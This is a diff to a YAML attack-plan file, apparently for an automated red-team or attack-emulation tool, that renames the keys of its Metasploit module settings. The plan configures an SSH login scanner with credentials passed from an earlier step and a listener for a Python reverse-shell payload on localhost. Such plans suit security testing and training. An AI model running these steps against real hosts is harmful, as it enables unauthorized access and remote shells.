@@ -40,9 +40,8 @@ plan:
             create_named_session: session_to_target_1
             module: metasploit
             module_arguments:
-              module_type: auxiliary
-              module: scanner/ssh/ssh_login
-              module_options:
+              module_name: scanner/ssh/ssh_login
+              datastore:
                 RHOSTS: localhost
                 USERNAME: $parent.username
                 PASSWORD: $parent.password
@@ -85,12 +84,9 @@ plan:
         - stage-http
       trigger_type: MSFListener
       trigger_args:
-        identifiers:
-          via_exploit: exploit/multi/handler
-          via_payload: payload/python/shell_reverse_tcp
-        exploit: multi/handler
-        payload: python/shell_reverse_tcp
-        payload_arguments:
+        module_name: multi/handler
+        datastore:
+          PAYLOAD: python/shell_reverse_tcp
           LHOST: localhost
           LPORT: 4444
       steps:
